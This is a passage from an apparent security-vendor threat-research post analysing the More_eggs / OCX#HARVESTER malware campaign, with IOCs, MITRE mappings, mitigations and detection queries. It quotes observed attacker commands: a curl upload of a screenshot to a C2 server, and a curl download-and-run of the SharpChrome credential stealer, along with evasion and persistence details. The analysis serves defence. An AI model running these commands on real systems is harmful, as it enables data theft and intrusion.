<p><span style="font-weight: 400;">In an effort to evade heuristic detection and as an anti-debugging measure, malware may incorporate long sleep times with several or all of its functions. This strain uses a separate function which executes the following command:</span></p>
<p><span style="font-weight: 400; color: #ff0000;">typeperf.exe &#8220;\\System\\Processor Queue Length&#8221; -si {sleep time in seconds} -sc 1</span></p>
<p><span style="font-weight: 400;">The usage of this particular functionality was seen with </span><a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Terraloader/2021-03-25/Analysis.md"><span style="font-weight: 400;">previous versions of Terraloader</span></a><span style="font-weight: 400;"> as well.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157d9110fc.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20136 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157d9110fc.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 11: [OCX#HARVESTER] &#8211; ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt: typeperf.exe execution</span></p>
<p><span style="font-weight: 400;">The function calling the command is leveraged heavily in the next section.</span></p>
<h4><span style="font-weight: 400;">Msxsl.exe execution [T1220]</span></h4>
<p><span style="font-weight: 400;">In another effort to maintain persistence on the host, the script would leverage the msxsl.exe LOLbin to re-run this particular script file and then sleep (using the typerf.exe method) every 120 seconds. This would ensure that C2 communication would be reestablished during internet disconnects or by potential application crashes. </span></p>
<h4><span style="font-weight: 400;">Additional functionality</span></h4>
<p><span style="font-weight: 400;">In addition to some of the more prominent features discussed, the script contains additional functionality such as:</span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">File read </span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">File write</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Execute command (using WScript.Shell)</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">AV enumeration</span></li>
</ul>
<h3><span style="font-weight: 400;">JS execution (QVB3WZXVQG6G8O7V.txt)</span></h3>
<p><span style="font-weight: 400;">This script is primarily for maintaining persistence on the host. If you recall it’s referenced by the registry modification <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">HKCU\\Environment\\UserInitMprLogonScript</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span>. Like every other we’ve analyzed is also heavily obfuscated however once translated into something human-readable it makes a bit more sense (figure x) </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157df40656.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20140 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157df40656.png" alt="" width="1491" height="231" /></a></p>
<p><span style="font-weight: 400;">Figure 12: [OCX#HARVESTER] -QVB3WZXVQG6G8O7V.txt: deobfuscated</span></p>
<p><span style="font-weight: 400;">This simple script leverages “Wscript.shell” to essentially use the msxsl.exe LOLbin to execute the contents of the main script: ZUW0Y1NVRZ6LIIHFO2AQNHTX.txt.</span></p>
<h2><span style="font-weight: 400;">OCX#HARVESTER (DLL) binary file analysis</span></h2>
<p><span style="font-weight: 400;">The next stage of the attack kicks off by downloading and executing a few different OCX#HARVESTER files. These are placed in different directories around the system after being downloaded using curl. Regsvr32.exe is then used to register the DLL payload. </span></p>
<p><span style="font-weight: 400;">We learn a couple things simply by examining the reference to the program database file (PDB) referenced in each of the OCX#HARVESTER files. First, it was compiled by a user account &#8220;David&#8221;,</span></p>
<p><span style="font-weight: 400;">though that doesn&#8217;t tell us much other than strengthen the fact these were all compiled by the same person. The folder structure is similar to that of Visual Studio and each was compiled for a 64-bit CPU architecture.</span></p>
<p><span style="font-weight: 400;">Referenced PDB File:  </span><span style="font-weight: 400; color: #ff0000;">C:\Users\David\source\repos\Rev\x64\Release\Rev.pdb</span></p>
<h3><span style="font-weight: 400;">Camera.OCX#HARVESTER</span></h3>
<p><span style="font-weight: 400;">This binary file was by far the smallest standing at only 177KB. The purpose of this binary appears to be quite simple as it appears to simply capture images of the user&#8217;s desktop. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157e3ea448.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20144 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157e3ea448.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 13: [OCX#HARVESTER] &#8211; camera.OCX#HARVESTER PE info</span></p>
<p><span style="font-weight: 400;">Once captured, the image is saved to <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">C:\Programdata\test.png</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> and uploaded to the attacker&#8217;s C2 server using curl. In our case we observed the following command:</span></p>
<p><span style="font-weight: 400; color: #ff0000;">&#8220;c:\windows\system32\cmd.exe&#8221; /v /c &#8220;curl -f &#8220;image=@c:\programdata\test.png&#8221; http://193.149.185.229/sas.php?name=REDACTED_HOSTNAME&#8221;</span></p>
<p><span style="font-weight: 400;">Notice that the victim machine&#8217;s hostname is appended to the &#8220;name&#8221; php parameter.</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157eac949c.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20148 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157eac949c.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 14: [OCX#HARVESTER] &#8211; camera.OCX#HARVESTER supporting debug data</span></p>
<h3><span style="font-weight: 400;">Foonet.OCX#HARVESTER and bonet.OCX#HARVESTER</span></h3>
<p><span style="font-weight: 400;">The binary file Foonet.OCX#HARVESTER and bonet.OCX#HARVESTER was also identified as a 64-bit PE executable masquerading as a DLL file. Similar to the others this binary was also compiled in C++ using Visual Studio. Both were identical file sizes and produced similar data when analyzed. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157f1e18ad.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20152 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157f1e18ad.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 15: [OCX#HARVESTER] &#8211; Foonet.OCX#HARVESTER PE info</span></p>
<p><span style="font-weight: 400;">The purpose of these binary files is largely unknown. We did however observe it making an external connection to 193.149.185[.]229 over port 1437. The binary file itself is heavily obfuscated making analysis difficult however, based on high level analysis of Foonet.OCX#HARVESTER, we were able to confirm the presence of the hard coded IP and port. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157f7afa10.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20156 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157f7afa10.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 16: [OCX#HARVESTER] &#8211; Foonet.OCX#HARVESTER supporting debug data: C2 IP/Port</span></p>
<h3><span style="font-weight: 400;">Tunner.OCX#HARVESTER</span></h3>
<p><span style="font-weight: 400;">This particular OCX#HARVESTER file was downloaded by the attackers however remained mostly unused, and aside from the web request record <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">hxxp://193.149.187[.]170/webdav/Tunner.OCX#HARVESTER</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> there was no indication of it being leveraged during any stage of the attack. </span></p>
<p><span style="font-weight: 400;">The file’s original name “MathATL.dll” is a bit smaller in size than the others at 271KB and also features counter-analysis and anti debugging characteristics. </span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644157fe65031.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20160 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644157fe65031.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 17: [OCX#HARVESTER] &#8211; Tunner.OCX#HARVESTER PE info</span></p>
<p><span style="font-weight: 400;">Things got a bit more interesting after analyzing the file a bit deeper. Hidden inside is a large XOR encoded block of text. Further analysis revealed that this file is likely a Cobalt Strike beacon which connects using the <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">ukmedia.store/static-directory/html.mp3</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> directory, a common directory structure and even file extension for </span><a href="https://raw.githubusercontent.com/basit10/TBAE-Threat-Based-Adversary-Emulation/d3e67fb5b8883d834a1a9580a34fae5262df4d83/Arsenal/HTTP_Traffic_profile/c3a22d29.profile"><span style="font-weight: 400;">Cobalt Strike Arsenal payloads</span></a><span style="font-weight: 400;">. </span></p>
<p><span style="font-weight: 400;">The user agent found in the shellcode is </span><a href="https://github.com/CronUp/Malware-IOCs/blob/main/2022-02-23_CobaltStrikeConfigs"><span style="font-weight: 400;">commonly used for default Cobalt Strike payloads</span></a><span style="font-weight: 400;"> which the attacker’s never bothered changing. (<span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span>)</span></p>
<p><a href="https://www.securonix.com/wp-content/uploads/2023/04/644158045f686.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="alignnone wp-image-20164 size-full" src="https://www.securonix.com/wp-content/uploads/2023/04/644158045f686.png" alt="" width="1600" height="956" /></a></p>
<p><span style="font-weight: 400;">Figure 18: [OCX#HARVESTER] &#8211; Tunner.OCX#HARVESTER Cobalt Strike implant shellcode</span></p>
<h2><span style="font-weight: 400;">C2 and infrastructure</span></h2>
<p><span style="font-weight: 400;">The following IP addresses and domains were observed as a part of the overall C2 infrastructure during [OCX#HARVESTER] campaign.</span></p>
<table id="tablepress-14" class="tablepress tablepress-id-14">
<thead>
<tr class="row-1">
<th class="column-1">IP address</th>
<th class="column-2">Description</th>
</tr>
</thead>
<tbody class="row-striping row-hover">
<tr class="row-2">
<td class="column-1">95.179.201[.]171</p>
<p>95.179.180[.]224</p>
<p>172.86.75[.]75</td>
<td class="column-2">Host robots.php</td>
</tr>
<tr class="row-3">
<td class="column-1">95.179.186[.]167</td>
<td class="column-2">C2: /Writer.php</td>
</tr>
<tr class="row-4">
<td class="column-1">95.179.170[.]76</td>
<td class="column-2">C2: telemistry[.]net/get.php?id=xxxxxxx</td>
</tr>
<tr class="row-5">
<td class="column-1">193.149.187[.]170</td>
<td class="column-2">Host Tunner.OCX#HARVESTER</td>
</tr>
<tr class="row-6">
<td class="column-1">193.149.185[.]229</td>
<td class="column-2">C2 implant: port 1437</td>
</tr>
</tbody>
</table>
<p><!-- #tablepress-14 from cache --></p>
<p>&nbsp;</p>
<table id="tablepress-15" class="tablepress tablepress-id-15">
<thead>
<tr class="row-1">
<th class="column-1">Full URLs</th>
</tr>
</thead>
<tbody class="row-striping row-hover">
<tr class="row-2">
<td class="column-1">hxxp://95.179.201[.]171/robots.php</p>
<p>hxxp://95.179.180[.]224/robots.php</p>
<p>httx://172.86.75[.]75/robots.php</td>
</tr>
<tr class="row-3">
<td class="column-1">hxxp://95.179.186[.]167/Writer.php</td>
</tr>
<tr class="row-4">
<td class="column-1">hxxp://193.149.185[.]229/sas.php</td>
</tr>
<tr class="row-5">
<td class="column-1">ukmedia[.]store/static-directory/html.mp3</td>
</tr>
<tr class="row-6">
<td class="column-1">hxxp://193.149.185[.]229/api/SharpChrome.exe</td>
</tr>
</tbody>
</table>
<p><!-- #tablepress-15 from cache --></p>
<p>&nbsp;</p>
<table id="tablepress-16" class="tablepress tablepress-id-16">
<thead>
<tr class="row-1">
<th class="column-1">DNS activity</th>
</tr>
</thead>
<tbody class="row-striping row-hover">
<tr class="row-2">
<td class="column-1">telemistry[.]net (95.179.170[.]76)</td>
</tr>
<tr class="row-3">
<td class="column-1">ukmedia[.]store</td>
</tr>
<tr class="row-4">
<td class="column-1">windowsupdatebg.s.llnwi[.]net</td>
</tr>
</tbody>
</table>
<p><!-- #tablepress-16 from cache --></p>
<h2><span style="font-weight: 400;">Some observations regarding potential attribution</span></h2>
<p><span style="font-weight: 400;">Historically, several MaaS customers have been sighted utilizing Golden Chickens. Probably the most famous of which is FIN6, which since 2018 has primarily </span><a href="https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/"><span style="font-weight: 400;">targeted the financial sector</span></a><span style="font-weight: 400;">. Others include the famous Cobalt Group from Russia and Evilnum out of Belarus. </span></p>
<p><span style="font-weight: 400;">The campaign which we observed starting in January this year began from a sample which originated from Turkey. (36bf06bde63af8cdd673444edf64a323195fe962b3256e0269cdd7a89a7e2ae1)</span></p>
<p><span style="font-weight: 400;">The modus operandi of the More_eggs malware suite tracks with past activity seen historically. Some commonalities between prior versions and the latest include:</span></p>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Obfuscated CMD in .lnk file using image lures</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Staging directory in %APPDATA\Microsoft\</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Ie4uinit.exe LOLBin</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Msxsl.exe LOLBin</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Persistence through the registry key \Environment\UserInitMprLogonScript</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Obfuscated JavaScript loader</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Obfuscated JavaScript backdoor</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Similar obfuscation techniques</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">OCX#HARVESTER file execution through regsvr32.exe</span></li>
</ul>
<h2><span style="font-weight: 400;">Post exploitation analysis and observations</span></h2>
<p><span style="font-weight: 400;">After gaining full access, the attackers attempted to download and run SharpChrome.exe downloaded and saved from one of the attacker’s C2 servers. The file was downloaded into the <span style="color: #ff0000;">“</span></span><span style="font-weight: 400; color: #ff0000;">%APPDATA\Adobe\</span><span style="font-weight: 400;"><span style="color: #ff0000;">”</span> directory and saved BTaker.exe.</span></p>
<p><a href="https://github.com/GhostPack/SharpDPAPI#sharpchrome"><span style="font-weight: 400;">SharpChrome</span></a><span style="font-weight: 400;"> is a version of SharpDPAPI which is designed to steal Chrome Cookies and login information. </span></p>
<p><span style="font-weight: 400;">We observed the attackers execute the following commands during the campaign:</span></p>
<table id="tablepress-17" class="tablepress tablepress-id-17">
<thead>
<tr class="row-1">
<th class="column-1">Executed Commands</th>
</tr>
</thead>
<tbody class="row-striping row-hover">
<tr class="row-2">
<td class="column-1">dier (typo)</td>
</tr>
<tr class="row-3">
<td class="column-1">dir</td>
</tr>
<tr class="row-4">
<td class="column-1">type update.js</td>
</tr>
<tr class="row-5">
<td class="column-1">type kohl.js</td>
</tr>
<tr class="row-6">
<td class="column-1">net user</td>
</tr>
<tr class="row-7">
<td class="column-1">net user /domain</td>
</tr>
<tr class="row-8">
<td class="column-1">cmd /v /c &#8220;curl hxxp://193.149.185[.]229/api/SharpChrome.exe -o %appdata%\Adobe\BTaker.exe &amp;&amp;cd %appdata%\Adobe&amp;&amp; BTaker.exe&#8221;</td>
</tr>
<tr class="row-9">
<td class="column-1">cd %appdata%</td>
</tr>
<tr class="row-10">
<td class="column-1">cmd</td>
</tr>
</tbody>
</table>
<p><!-- #tablepress-17 from cache --></p>
<h2><span style="font-weight: 400;">Conclusion</span></h2>
<p><span style="font-weight: 400;">Based on what we observed as part of the OCX#HARVESTER attack campaign, it&#8217;s apparent that even recently, the More_eggs suite of malware used as part of the attack campaign is continually being maintained and retooled in an attempt to circumvent detections. The Securonix Threat Research team will continue to monitor for changes and new attack vectors associated with the attack campaign and the malware suite. Updates will be provided as needed. </span></p>
<h2><span style="font-weight: 400;">Securonix recommendations and mitigations</span></h2>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Avoid opening any attachments especially from those that are unexpected or are from outside the organization. Be extra vigilant with .zip, .iso, and .img attachments.</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Implement an application whitelisting policy to restrict the execution of unknown binaries</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Deploy additional process-level logging such as </span><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"><span style="font-weight: 400;">Sysmon</span></a><span style="font-weight: 400;"> and </span><a href="https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/"><span style="font-weight: 400;">PowerShell logging</span></a><span style="font-weight: 400;"> for additional log detection coverage</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Securonix customers can scan endpoints using the Securonix Seeder Hunting Queries below</span></li>
</ul>
<h3><span style="font-weight: 400;">MITRE ATT&amp;CK Matrix</span></h3>
<table id="tablepress-18" class="tablepress tablepress-id-18">
<thead>
<tr class="row-1">
<th class="column-1">Tactic</th>
<th class="column-2">Technique</th>
</tr>
</thead>
<tbody class="row-striping row-hover">
<tr class="row-2">
<td class="column-1">Initial Access</td>
<td class="column-2">T1566: Phishing<br />
T1566.001: Phishing: Spearphishing Attachment</td>
</tr>
<tr class="row-3">
<td class="column-1">Execution</td>
<td class="column-2">T1204.002: User Execution: Malicious File</p>
<p>T1059.001: Command and Scripting Interpreter: PowerShell</p>
<p>T1059.003: Command and Scripting Interpreter: Windows Command Shell</p>
<p>T1059.007: Command and Scripting Interpreter: JavaScript<br />
T1204.001: User Execution: Malicious Link</td>
</tr>
<tr class="row-4">
<td class="column-1">Defense Evasion</td>
<td class="column-2">T1218.005: System Binary Proxy Execution: Mshta<br />
T1218.010: System Binary Proxy Execution: Regsvr32<br />
T1220: XSL Script Processing</td>
</tr>
<tr class="row-5">
<td class="column-1">Persistence</td>
<td class="column-2">T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder</td>
</tr>
<tr class="row-6">
<td class="column-1">Command and Control</td>
<td class="column-2">T1573.001:  Encrypted Channel: Symmetric Cryptography<br />
T1071.001: Application Layer Protocol: Web ProtocolsT1105: Ingress Tool Transfer T1571: Non-Standard Port </td>
</tr>
<tr class="row-7">
<td class="column-1">Exfiltration</td>
<td class="column-2">T1041: Exfiltration Over C2 Channel</td>
</tr>
</tbody>
</table>

<p><!-- #tablepress-19 from cache --></p>
<h3><span style="font-weight: 400;">Relevant Securonix detection policies</span></h3>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">EDR-ALL-1171-ERR</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">EDR-ALL-1204-RU</span></li>
<li aria-level="1"><span style="font-weight: 400;">EDR-ALL-225-RU</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">WEL-ALL-1155-RU</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">EDR-ALL-1169-RU</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">EDR-ALL-993-RU</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">EDR-ALL-1168-RU</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">EDR-ALL-1193-RU</span></li>
</ul>
<h3><span style="font-weight: 400;">Relevant Spotter queries</span></h3>
<ul>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">rg_functionality = &#8220;Endpoint Management Systems&#8221; AND (deviceaction = &#8220;Process Create&#8221; OR deviceaction = &#8220;ProcessCreate&#8221; OR deviceaction = &#8220;Process Create (rule: ProcessCreate)&#8221; OR deviceaction = &#8220;ProcessRollup2&#8221; OR deviceaction = &#8220;SyntheticProcessRollUp2&#8221; OR deviceaction = &#8220;WmiCreateProcess&#8221; OR deviceaction = &#8220;Trace Executed Process&#8221; OR deviceaction = &#8220;Process&#8221; OR deviceaction = &#8220;Childproc&#8221; OR deviceaction = &#8220;Procstart&#8221; OR deviceaction = &#8220;Process Activity: Launched&#8221;) AND destinationprocessname ENDS WITH &#8220;typeperf.exe&#8221; AND resourcecustomfield1 CONTAINS &#8220;\system\processor queue length&#8221; AND resourcecustomfield1 CONTAINS &#8221; -si &#8221; AND resourcecustomfield1 CONTAINS &#8221; -sc &#8220;</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">rg_functionality = &#8220;Endpoint Management Systems&#8221; AND (deviceaction = &#8220;Process Create&#8221; OR deviceaction = &#8220;ProcessCreate&#8221; OR deviceaction = &#8220;Process Create (rule: ProcessCreate)&#8221; OR deviceaction = &#8220;ProcessRollup2&#8221; OR deviceaction = &#8220;SyntheticProcessRollUp2&#8221; OR deviceaction = &#8220;WmiCreateProcess&#8221; OR deviceaction = &#8220;Trace Executed Process&#8221; OR deviceaction = &#8220;Process&#8221; OR deviceaction = &#8220;Childproc&#8221; OR deviceaction = &#8220;Procstart&#8221; OR deviceaction = &#8220;Process Activity: Launched&#8221;) AND (destinationprocessname ENDS WITH &#8220;msxsl.exe&#8221; OR filename = &#8220;msxsl.exe&#8221;) AND (resourcecustomfield8 CONTAINS &#8220;\Appdata\Local\&#8221; OR resourcecustomfield8 CONTAINS &#8220;\Appdata\Roaming\&#8221; OR resourcecustomfield8 CONTAINS &#8220;\ProgramData\&#8221; OR resourcecustomfield8 CONTAINS &#8220;\Users\Public\&#8221; OR filename = &#8220;msxsl.exe&#8221;) AND destinationprocessname NOT ENDS WITH &#8220;msxsl.exe&#8221;</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">rg_functionality = &#8220;Endpoint Management Systems&#8221; AND (deviceaction = &#8220;Process Create&#8221; OR deviceaction = &#8220;ProcessCreate&#8221; OR deviceaction = &#8220;Process Create (rule: ProcessCreate)&#8221; OR deviceaction = &#8220;ProcessRollup2&#8221; OR deviceaction = &#8220;SyntheticProcessRollUp2&#8221; OR deviceaction = &#8220;WmiCreateProcess&#8221; OR deviceaction = &#8220;Trace Executed Process&#8221; OR deviceaction = &#8220;Process&#8221; OR deviceaction = &#8220;Childproc&#8221; OR deviceaction = &#8220;Procstart&#8221; OR deviceaction = &#8220;Process Activity: Launched&#8221;) AND (((destinationprocessname ENDS WITH &#8220;ie4uinit.exe&#8221; OR filename = &#8220;IE4UINIT.EXE&#8221;) AND resourcecustomfield8 NOT CONTAINS &#8220;Windows\System32&#8221; AND resourcecustomfield8 NOT CONTAINS &#8220;Windows\SysWOW64&#8221;) OR (filename = &#8220;IE4UINIT.EXE&#8221; AND destinationprocessname NOT ENDS WITH &#8220;ie4uinit.exe&#8221;))</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">rg_functionality = &#8220;Endpoint Management Systems&#8221; AND (deviceaction = &#8220;Process Create&#8221; OR deviceaction = &#8220;ProcessCreate&#8221; OR deviceaction = &#8220;Process Create (rule: ProcessCreate)&#8221; OR deviceaction = &#8220;ProcessRollup2&#8221; OR deviceaction = &#8220;SyntheticProcessRollUp2&#8221; OR deviceaction = &#8220;WmiCreateProcess&#8221; OR deviceaction = &#8220;Trace Executed Process&#8221; OR deviceaction = &#8220;Process&#8221; OR deviceaction = &#8220;Childproc&#8221; OR deviceaction = &#8220;Procstart&#8221; OR deviceaction = &#8220;Process Activity: Launched&#8221;) AND destinationprocessname ENDS WITH &#8220;wmic.exe&#8221; AND resourcecustomfield1 CONTAINS &#8220;process&#8221; AND resourcecustomfield1 CONTAINS &#8220;call&#8221; AND resourcecustomfield1 CONTAINS &#8220;create&#8221;</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">rg_functionality = &#8220;Endpoint Management Systems&#8221; AND (destinationprocessname ENDS WITH &#8220;curl.exe&#8221; OR destinationprocessname ENDS WITH &#8220;wget.exe&#8221;) AND (resourcecustomfield1 CONTAINS &#8220;.jpg&#8221; OR resourcecustomfield1 CONTAINS &#8220;.jpeg&#8221; OR resourcecustomfield1 CONTAINS &#8220;.png&#8221;) AND (resourcecustomfield1 CONTAINS &#8220;http://&#8221; OR resourcecustomfield1 CONTAINS &#8220;https://&#8221;)</span></li>
<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">(rg_functionality = &#8220;Next Generation Firewall&#8221; OR rg_functionality = &#8220;Web Application Firewall&#8221; OR rg_functionality = &#8220;Web Proxy&#8221;) AND (destinationaddress = &#8220;95.179.201[.]171&#8221; OR destinationaddress = &#8220;95.179.186[.]167&#8221; OR destinationaddress = &#8220;95.179.170[.]76&#8221; OR destinationaddress = &#8220;193.149.187[.]170&#8221; OR destinationaddress = &#8220;193.149.185[.]229&#8221;)</span></li>
</ul>
<h3><span style="font-weight: 400;">References:</span></h3>
<p><span style="font-weight: 400;">[1] More_eggs, Anyone? Threat Actor ITG08 Strikes Again</span><span style="font-weight: 400;"><br />

	</div>

<div data-wpr-lazyrender="1" class="single-content-section single-nav-section avia-section main_color avia-section-default avia-no-border-styling container_wrap fullsize">
	<div class="container">
		<div class="content">
			<div class="entry-content-wrapper">
										<div class="single-post-nav-item prev-post">
							<a href="https://www.securonix.com/blog/an-exciting-step-towards-unified-tdir/">
								<span class="single-post-nav-label">Previous Article</span>
								<h4 class="single-post-nav-post-name">An Exciting Step Towards Unified TDIR</h4>
							</a>
						</div>						<div class="single-post-nav-item next-post">
							<a href="https://www.securonix.com/blog/is-data-storage-holding-you-back/">
								<span class="single-post-nav-label">Next Article</span>
								<h4 class="single-post-nav-post-name">Is Data Storage Holding Back Your SIEM’s Ability to Detect, Investigate and Respond to Threats?</h4>
							</a>
						</div>
								</div>
        </div>
	</div>
</div>

					<ul id="menu-footer-solutions" class="menu" role="menu"><li role="menuitem" id="menu-item-27011" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-1"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Solutions</span></span>

	<li role="menuitem" id="menu-item-26986" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/solutions/cloud-security-monitoring/microsoft-azure-security-monitoring-with-securonix/" tabindex="0"><span class="avia-menu-text">Microsoft Azure</span></a></li>
	<li role="menuitem" id="menu-item-26985" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/solutions/cloud-security-monitoring/microsoft-office-365/" tabindex="0"><span class="avia-menu-text">Microsoft 365</span></a></li>
	<li role="menuitem" id="menu-item-26990" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/solutions/use-case/insider-threat/" tabindex="0"><span class="avia-menu-text">Insider Threat</span></a></li>
	<li role="menuitem" id="menu-item-26992" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://www.securonix.com/solutions/use-case/network-detection-and-response/" tabindex="0"><span class="avia-menu-text">NDR</span></a></li>

	<div class="cmplz-header">
		<div class="cmplz-logo"><a href="https://www.securonix.com/" class="custom-logo-link" rel="home"><img width="250" height="210" src="https://www.securonix.com/wp-content/uploads/2021/12/cropped-cropped-cropped-cropped-cropped-Securonix-Logo_ForWeb-RGB_Icon-2-e1638379245470.png" class="custom-logo" alt="Securonix Logo" decoding="async" /></a></div>

		<div class="cmplz-close" tabindex="0" role="button" aria-label="Close dialog">
			<svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="times" class="svg-inline--fa fa-times fa-w-11" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 352 512"><path fill="currentColor" d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"></path></svg>

	<div class="cmplz-divider cmplz-divider-header"></div>
	<div class="cmplz-body">
		<div class="cmplz-message" id="cmplz-message-3-optout"><p>Our site uses cookies and similar technologies to analyze site usage, personalize the site, and for online advertising purposes. &nbsp;To manage cookies, click “Opt-out preferences.”</p></div>
		<!-- categories start -->
		<div class="cmplz-categories">
			<details class="cmplz-category cmplz-functional" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Strictly Necessary</span>
							<span class='cmplz-always-active'>
								<span class="cmplz-banner-checkbox">
									<input type="checkbox"
										   id="cmplz-functional-optout"
										   data-category="cmplz_functional"
										   class="cmplz-consent-checkbox cmplz-functional"
										   size="40"
										   value="1"/>

				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-functional">These Cookies are strictly necessary to provide the Websites to you, because they do things like log consents and provide security.</span>
				</div>
			</details>

			<details class="cmplz-category cmplz-preferences" >
				<summary>
						<span class="cmplz-category-header">
							<span class="cmplz-category-title">Preferences</span>

									   id="cmplz-preferences-optout"

							</span>
						</span>
				</summary>
				<div class="cmplz-description">
					<span class="cmplz-description-preferences">The technical storage or access is necessary for the legitimate purpose of storing preferences that are not requested by the subscriber or user.</span>
				</div>
			</details>

			<details class="cmplz-category cmplz-statistics" >
				<summary>
						<span class="cmplz-category-header">

	<div class="cmplz-links cmplz-information">

 <script type='text/javascript'>
 /* <![CDATA[ */  
var punch_globals = punch_globals || {};
